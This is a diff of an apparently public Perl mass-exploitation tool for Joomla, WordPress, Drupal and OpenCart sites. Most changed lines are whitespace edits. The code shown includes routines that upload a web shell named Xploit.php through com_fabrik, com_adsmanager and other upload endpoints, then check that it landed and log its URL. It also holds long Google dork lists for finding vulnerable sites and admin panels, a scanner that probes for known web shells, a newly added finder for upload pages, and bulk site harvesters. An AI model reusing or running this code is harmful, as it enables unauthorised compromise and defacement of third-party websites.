     print color('reset');
 	}}
-	
+
 sub com_content3(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5272,7 +5279,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_content4(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5294,7 +5301,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 
 sub com_users(){
 print color('bold red'),"[";
@@ -5318,7 +5325,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_installer(){
 print color('bold red'),"[";
 print color('bold green'),"+";
@@ -5341,7 +5348,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_search1(){
 print color('bold red'),"[";
 print color('bold green'),"+";
@@ -5364,7 +5371,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_poll(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5386,7 +5393,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_banners(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5408,7 +5415,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_mailto1(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5430,7 +5437,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_a6mambocredits(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5452,7 +5459,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_a6mambohelpdesk(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5474,7 +5481,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_advancedpoll(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5496,7 +5503,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_akocomment(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5518,7 +5525,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_articles(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5540,7 +5547,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_artlinks(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5562,7 +5569,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_trade(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5584,7 +5591,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_bayesiannaivefilter(){            print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5606,7 +5613,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_babackup(){           print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5744,7 +5751,7 @@ my $field_name = "Filedata";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
-           
+
             );
 
 $comfabrikupp="$site/media/Xploit.php";
@@ -5783,7 +5790,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
-           
+
             );
 
 $comfabrikup="$site/media/Xploit.html";
@@ -5823,7 +5830,7 @@ my $shell ="Xploit.php";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["file" => ["$shell"]]
-           
+
             );
 
 $comfabrikupp2="$site/Xploit.php";
@@ -5861,7 +5868,7 @@ my $index ="Xploit.html";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["file" => ["$index"]]
-           
+
             );
 
 $comfabrikup2="$site/Xploit.html";
@@ -5902,7 +5909,7 @@ my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";
 
 my $response = $ua->post( $url,
             Cookie => "", Content_Type => "form-data", Content => [file => ["Xploit1.jpg"], name => "ph.hitachi.html"]
-           
+
             );
 
 $comadsmanager="$site/tmp/plupload/ph.hitachi.html";
@@ -5944,8 +5951,8 @@ print color('bold white'),"Com Blog";
 print color('bold white')," .......................... ";
 print color('bold green'),"VULN\n";
 print color('bold white'),"Exploit It It Manual\n";
-    open(TEXT, '>>Result/Try manual.txt');   
-    print TEXT "[blog] $site\n";   
+    open(TEXT, '>>Result/Try manual.txt');
+    print TEXT "[blog] $site\n";
     close(TEXT);
 }else{
   print color('bold red'),"[";
@@ -5972,8 +5979,8 @@ print color('bold white'),"Com Users";
 print color('bold white')," ......................... ";
 print color('bold green'),"VULN\n";
 print color('bold white'),"Exploit It Manual\n";
-    open(TEXT, '>>Result/Try manual.txt');   
-    print TEXT "[Com Users] $site\n";   
+    open(TEXT, '>>Result/Try manual.txt');
+    print TEXT "[Com Users] $site\n";
     close(TEXT);
 }else{
   print color('bold red'),"[";
@@ -6083,7 +6090,7 @@ print color('bold red'),"NOT VULN\n\n";
 
 
         }
-	
+
 }
 ################ com_redmystic #####################
 sub redmy(){
@@ -6134,7 +6141,7 @@ my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => 
 $sexyup="$site/images/stories/Xploit.jpg";
 
 $checkpofxwup = $ua->get("$sexyup")->content;
-if($checkpofxwup =~/X Xploit/) {		
+if($checkpofxwup =~/X Xploit/) {
 
   print color('bold red'),"[";
 print color('bold green'),"+";
@@ -6146,7 +6153,7 @@ print color('red')," * ";
 print color('reset');
 print color('bold white'),"  Shell Uploaded Successfully\n";
 print color('bold white'),"  [LINK] => $uploadfolder\n";
-    open(TEXT, '>>Result/shell.txt');   
+    open(TEXT, '>>Result/shell.txt');
 print TEXT "$uploadfolder\n";
 close (TEXT);
 }else{
@@ -6169,13 +6176,13 @@ my $field_name = "Filedata";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 
 $sexyup="$site/images/stories/Xploit.jpg";
 
 $checkpofxwup = $ua->get("$sexyup")->content;
-if($checkpofxwup =~/X Xploit/) {		
+if($checkpofxwup =~/X Xploit/) {
 
   print color('bold red'),"[";
 print color('bold green'),"+";
@@ -6187,7 +6194,7 @@ print color('red')," * ";
 print color('reset');
 print color('bold white'),"  shell Uploaded Successfully\n";
 print color('bold white'),"  [Link] => $uploadfolder?X=Xploit\n";
-open(TEXT, '>>Result/shell.txt');   
+open(TEXT, '>>Result/shell.txt');
 print TEXT "$uploadfolder?X=Xploit\n";
 close (TEXT);
 }else{
@@ -6596,15 +6603,15 @@ close (TEXT);
 }
 sub scanwordpress(){
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
-print color('green'); 
+print color('green');
 print q{
-     __      __                        .___                                             
+     __      __                        .___
     /  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______
     \   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/
-     \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ 
+     \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \
       \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >
-           \/                           \/  |__|                   \/       \/       \/ 
-                               
+           \/                           \/  |__|                   \/       \/       \/
+
    };
 print colored("Your website list: ",'BOLD WHITE');
 $list=<STDIN>;
@@ -6619,7 +6626,7 @@ OUTER: foreach $site(@TARGETS){
 chomp($site);
 $a++;
 foreach $site(@list) {
- 
+
 if($site !~ /http:\/\//) { $site = "$site/"; };
 detect();
 }
@@ -6631,7 +6638,7 @@ my $content = $ua->get("$site")->content;
 if($content =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print color("bold green"), " - WordPress\n\n";
 print color('reset');
 open(TEXT, '>>CMS/wordpress.txt');
@@ -6714,7 +6721,7 @@ mapprolbs();
 else{
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print  color("bold red"), " - Unknown\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Unknown.txt');
@@ -6731,11 +6738,11 @@ print q{
   _____                          _  ______
  |  __ \                        | ||  ____|
  | |  | |_ __ _   _ _ __   __ _ | || |__  __  ___ __
- | |  | | '__| | | | '_ \ / _` || ||  __| \ \/ / '_ \ 
+ | |  | | '__| | | | '_ \ / _` || ||  __| \ \/ / '_ \
  | |__| | |  | |_| | |_) | (_| || || |____ >  <| |_) |
  |_____/|_|   \__,_| .__/ \__,_||_||______/_/\_\ .__/
                    | |                         | |
-                   |_|                         |_|     
+                   |_|                         |_|
 };
 print colored("Enter your websites list: ",'BOLD WHITE');
 $list=<STDIN>;
@@ -6750,7 +6757,7 @@ OUTER: foreach $site(@TARGETS){
 chomp($site);
 $a++;
 foreach $site(@lista) {
- 
+
 if($site !~ /http:\/\//) { $site = "$site/"; };
 drupalscan();
 }
@@ -6762,7 +6769,7 @@ my $content = $ua->get("$site")->content;
 if($content =~/Drupal|drupal|sites\/all|drupal.org/) {
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print color("bold green"), " - Drupal\n\n";
 print color('reset');
 open(TEXT, '>>CMS/DRUPAL.txt');
@@ -6774,7 +6781,7 @@ drupalgeddon();
 else{
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print  color("bold red"), " - Unknown\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Unknown.txt');
@@ -6788,14 +6795,14 @@ sub scanjoomla(){
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
 print color('blue');
 print q{
-       _                           _       ______                    
-      | |                         | |     |  ____|                   
-      | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __          
-  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \         
- | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |        
-  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/         
-                                                      | |            
-                                                      |_|            
+       _                           _       ______
+      | |                         | |     |  ____|
+      | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __
+  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \
+ | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |
+  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/
+                                                      | |
+                                                      |_|
 };
 print colored("Enter your websites list: ",'BOLD WHITE');
 $list=<STDIN>;
@@ -6810,7 +6817,7 @@ OUTER: foreach $site(@TARGETS){
 chomp($site);
 $a++;
 foreach $site(@lista) {
- 
+
 if($site !~ /http:\/\//) { $site = "$site/"; };
 joomlascan();
 }
@@ -6818,13 +6825,13 @@ sub joomlascan($site){
 $ua = LWP::UserAgent->new(keep_alive => 1);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 $ua->timeout (8);
- 
+
 my $content = $ua->get("$site")->content;
 if($content =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
-print color("bold green"), " - Joomla\n\n";    
+print color('bold white'),"] $site ";
+print color("bold green"), " - Joomla\n\n";
 print color('reset');
 open(TEXT, '>>CMS/joomla.txt');
 print TEXT "$site\n";
@@ -6890,7 +6897,7 @@ b2j();
 else{
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print  color("bold red"), " - Unknown\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Unknown.txt');
@@ -6915,7 +6922,7 @@ OUTER: foreach $site(@TARGETS){
 chomp($site);
 $a++;
 foreach $site(@lista) {
- 
+
 if($site !~ /http:\/\//) { $site = "$site/"; };
 cart();
 }
@@ -6923,12 +6930,12 @@ sub cart($site){
 $ua = LWP::UserAgent->new(keep_alive => 1);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 $ua->timeout (8);
- 
+
 my $content = $ua->get("$site")->content;
 if($content =~/opencart\/OpenCart/) {
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print color("bold green"), " - OpenCart\n\n";
 print color('reset');
 open(TEXT, '>>CMS/OpenCart.txt');
@@ -6939,7 +6946,7 @@ OpenCart();
 else{
 print color('bold white'), " [";
 print color('bold green'),"$a";
-print color('bold white'),"] $site ";	
+print color('bold white'),"] $site ";
 print  color("bold red"), " - Unknown\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Unknown.txt');
@@ -6973,7 +6980,7 @@ print color('bold white'),"] Wordpress Dorks ";
 print color('bold white'), " [";
 print color('bold green'),"+";
 print color('bold white'),"] \n\n
-			
+
 inurl:/wp-content/plugins/gravityforms/
 /wp-content/plugins/gravityforms/
 index of /wp-content/uploads/gravity_forms/
@@ -7016,14 +7023,14 @@ wordfence
 Tevolution
 Addblockblocker \n\n";
 
- 
+
 print color('bold white'), " [";
 print color('bold green'),"+";
 print color('bold white'),"] Joomla Dorks ";
 print color('bold white'), " [";
 print color('bold green'),"+";
 print color('bold white'),"]\n\n
-				
+
 inurl:/index.php?option=com_jce
 index.php?option=com_jce
 index.php?option=com_aardvertiser
@@ -7810,14 +7817,14 @@ index.php?option=com_as_shop
 index.php?option=com_msg
 index.php?option=com_club
 modules/mod_simplefileuploadv1.3\n\n";
-          
+
 print color('bold white'), " [";
 print color('bold green'),"+";
 print color('bold white'),"] Lokomedia Dorks ";
 print color('bold white'), " [";
 print color('bold green'),"+";
 print color('bold white'),"]\n\n
-		  
+
 nurl:statis-1-profil.html
 inurl:statis-2-profil.html
 inurl:statis-3-strukturorganisasi.html
@@ -7836,7 +7843,7 @@ inurl:foto_produk intext:shop
 inurl:foto_banner intext:shop
 inurl:foto_berita intext:shop
 inurl:foto_user intext:shop
-inurl:/adminweb/login 
+inurl:/adminweb/login
 inurl:content.php?module=banner
 inurl:content.php?module=user
 inurl:content.php?module=berita
@@ -7852,7 +7859,7 @@ intext:copyright @ inurl:/berita- - ext:html site:.
 intext:Kembali ke Website Utama
 intext:Developed by  inurl:berita- ext:html
 intext:copyright by  inurl:statis-1 ext:html
-inurl:/semua-berita.html site:coli :V 
+inurl:/semua-berita.html site:coli :V
 intext:copyright @ inurl:/berita- - ext:html site:.
 intext:Kembali ke Website Utama
 intext:Developed by  inurl:berita- ext:html
@@ -7869,7 +7876,7 @@ print color('bold green'),"+";
 print color('bold white'),"]\n\n
 
 intext:Developed by  inurl:berita- ext:html
-intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR 
+intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR
 intittle:adminstration login lokomedia site:+your country
 intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR site:+your country
 intittle:adminstration login lokomedia site:+your country
@@ -7885,14 +7892,14 @@ intittle:.:: ADMINISTRATOR LOGIN ::. site:+your country
 intittle:adminstration > login site:+your country
 intittle:adminstration > Website site:+your country
 intitle:Panel Administrator
-inur:.com/adminweb 
-inur:.org/adminweb 
-inur:.net/adminweb 
-inur:.go.id/adminweb 
-inur:.desa.id/adminweb 
-inur:.co.id/adminweb 
-inur:.web.id/adminweb 
-inur:/adminweb 
+inur:.com/adminweb
+inur:.org/adminweb
+inur:.net/adminweb
+inur:.go.id/adminweb
+inur:.desa.id/adminweb
+inur:.co.id/adminweb
+inur:.web.id/adminweb
+inur:/adminweb
 
 put all this in file txt === > ";
 print color("blue"),"Dorks.txt then run script again and choose 1\n\n";
@@ -7920,9 +7927,9 @@ sub shellscan() {
 print " Enter Site : ";
 $site=<STDIN>;
 chomp $site;
- 
+
 if($site !~ /http:\/\//) { $site = "$site/"; };
- 
+
 print "\n";
 @path = ('WSO.php','1998.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','13.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
 'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','indoxploit.php','IndoXploit.php','andela.php','mini.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
@@ -8734,13 +8741,15 @@ $useragent = LWP::UserAgent->new();
 
 $response = $useragent->request($req);
 
-if ($response->is_success){
-print color("bold Green"),("[Webshell Found] ==> $url  \n");
+if ($response->is_success && $response->content =~ /Uname:|server:|Files|sql|Php|symlink|zone-h|Disabled Functions:/){
+print color("bold white"),("$site$shell =>");
+print color("bold Green"),("Found\n");
 open(TEXT, '>>Result/shellfound.txt');
-   print TEXT "$url\n";  
+   print TEXT "$url\n";
    close(TEXT);
 }else{
-print color("bold red"),("[Webshell Not Found] ==> $shell\n");
+print color("bold white"),("$site$shell =>");
+print color("bold red"),("Not Found\n");
 }
 }
 exit;
@@ -8783,7 +8792,7 @@ open(TEXT, '>>Grab site[dork].txt');
     close(TEXT);
 	push(@result,$link);
 }
-} 
+}
 }
 }
 }
@@ -8798,20 +8807,20 @@ while(<tarrget>){
 chomp($_);
 $target = $_;
 close(FILE);
- 
+
 # For each hostname, fetch the IP address
 foreach $hostname ($target) {
    chomp($hostname);
    if($hostname) {
       $ip = gethostbyname($hostname);
       if($ip) {
-        
+
 		print "\n" , $hostname."==>".inet_ntoa($ip);
-		
+
 		open (TEXT, '>>Result/list-to-Ip.txt');
 print TEXT "\n" , "".inet_ntoa($ip);
 undef $ip;
-close (TEXT);       
+close (TEXT);
 }else {
         # Print 0.0.0.0 for unresolved Hostnames
         printf "%sn\n" , $hostname.":0.0.0.0";
@@ -8843,31 +8852,100 @@ gett();
 }else{
 gett();
 open(TEXT, '>>Result/Generator.txt');
-   print TEXT "$list\n";  
+   print TEXT "$list\n";
    close(TEXT);
 }
 }
 }
-	
+sub updated(){
+system("git clone https://github.com/PhHitachi/SecurityXploit.git");
+system("cd SecurityXploit && sudo bash ./install.sh && sudo chmod +x ./install.sh");
+system("perl Xploit.pl");
+}
+sub uploader(){
+print " Enter Site : ";
+$site=<STDIN>;
+chomp $site;
+
+if($site !~ /http:\/\//) { $site = "$site/"; };
+
+print "\n";
+@uploader = ('uploader.php/',
+'uploads/', 
+'upload/', 
+'files/', 
+'resume/', 
+'resumes/', 
+'documents/', 
+'docs/', 
+'pictures/', 
+'file/', 
+'Upload/', 
+'Uploads/', 
+'Resume/',  
+'UsersFiles/', 
+'Usersiles/', 
+'usersFiles/', 
+'Users_Files/', 
+'UploadedFiles/',
+'Uploaded_Files/', 
+'uploadedfiles/', 
+'uploadedFiles/', 
+'hpage/', 
+'admin/upload/', 
+'admin/uploads/', 
+'admin/resume/', 
+'admin/resumes/', 
+'admin/pictures/', 
+'pics/', 
+'photos/', 
+'Alumni_Photos/', 
+'alumni_photos/', 
+'AlumniPhotos/', 
+'users/',
+'add_news/',
+'admin/add_news/');
+
+foreach $uploader(@uploader){
+
+$url = $site.$uploader;
+$req = HTTP::Request->new(GET=>$url);
+$useragent = LWP::UserAgent->new();
+
+$response = $useragent->request($req);
+
+if ($response->is_success && $response->content =~ /choose file/ && $response->content =~ /upload/){
+print color("bold white"),("$site$uploader =>");
+print color("bold Green"),("Found\n");
+open(TEXT, '>>Result/shellfound.txt');
+   print TEXT "$url\n";
+   close(TEXT);
+}else{
+print color("bold white"),("$site$uploader =>");
+print color("bold red"),("Not Found\n");
+}
+}
+exit;
+}
 ###############################################################################################
 ################################## credits to Wissem Mahfoud ##################################
 ###############################################################################################
 sub websitegrabber(){
-my $datetime    = localtime;
+my $datetime  = localtime();
 $mech = WWW::Mechanize->new(autocheck => 0);
 $ag = LWP::UserAgent->new();
 $ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $ag->timeout(10);
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
-$res="target";
+$res="Extract";
     if (-e $res)
     {
     }
     else
     {
         mkdir $res or die "WE CAN NOT CREATE THE BOARD OF DIRECTORS: $res";
-    }										
-$logo="                                                                                                                               
+    }
+$logo="
                       .                                                      .
                     .n                   .                 .                  n.
               .   .dP                  dP                   9b                 9b.    .
@@ -8883,34 +8961,34 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
 print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";
-print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]";print color("green"),"Mass Grab by ip or site list \n";
-print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]";print color("green"),"Mass Grab Range by ip or site list \n";
-print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]";print color("green"),"choose ur country u want it \n";
-print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]";print color("green"),"find sites in all COUNTRY domain \n";
-print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]";print color("green"),"find sites in all WORK domainS \n";
-print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]";print color("green"),"find sites in ALL domainS \n";
-print color("green" ), "\t   [";print color("red"),"7";print color("green"),"]";print color("green"),"extract sites from ip server \n";
-print color("green" ), "\t   [";print color("red"),"0";print color("green"),"]";print color("green"),"GO_BACK <-- \n\n\n";
+print color("green" ), "\t[";print color("red"),"1";print color("green"),"]";print color("blue"),"Mass Grab by ip or site list \n";
+print color("green" ), "\t[";print color("red"),"2";print color("green"),"]";print color("red"),"Mass Grab Range by ip or site list \n";
+print color("green" ), "\t[";print color("red"),"3";print color("green"),"]";print color("green"),"choose ur country u want it \n";
+print color("green" ), "\t[";print color("red"),"4";print color("green"),"]";print color("yellow"),"find sites in all COUNTRY domain \n";
+print color("green" ), "\t[";print color("red"),"5";print color("green"),"]";print color("blue"),"find sites in all WORK domainS \n";
+print color("green" ), "\t[";print color("red"),"6";print color("green"),"]";print color("red"),"find sites in ALL domainS \n";
+print color("green" ), "\t[";print color("red"),"7";print color("green"),"]";print color("green"),"extract sites from ip server \n";
+print color("green" ), "\t[";print color("red"),"0";print color("green"),"]";print color("red"),"GO_BACK <-- \n\n\n";
 print color("green"),"[+] Choose Number : ";
 my $toolZ = <STDIN>;
 chomp $toolZ;
 if($toolZ eq '0')
 {
-system(($^O eq 'MSWin32') ? 'cls' : 'banner;');
-}
+goto main;
+};
 if($toolZ eq '1')
 {
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
-$logo="                                                                                                                         
+$logo="
                       .                                                      .
                     .n                   .                 .                  n.
               .   .dP                  dP                   9b                 9b.    .
@@ -8926,11 +9004,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -8974,11 +9052,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9019,11 +9097,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9053,11 +9131,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9079,7 +9157,6 @@ print color('reset');
 THE();
 }
 }
-
 if($toolZ eq '5')
 {
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
@@ -9099,11 +9176,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9144,11 +9221,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9174,11 +9251,11 @@ if ($toolZ eq '7')
 {
 Into();
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub gettt()
 {
 
@@ -9192,11 +9269,11 @@ print " [IP] > [$ips]\n";
 $dork="ip:$ips";
 THE();
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub gett()
 {
 $ip= (gethostbyname($tofuck))[4];
@@ -9214,11 +9291,11 @@ THE();
 }
 }
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub crew
 {
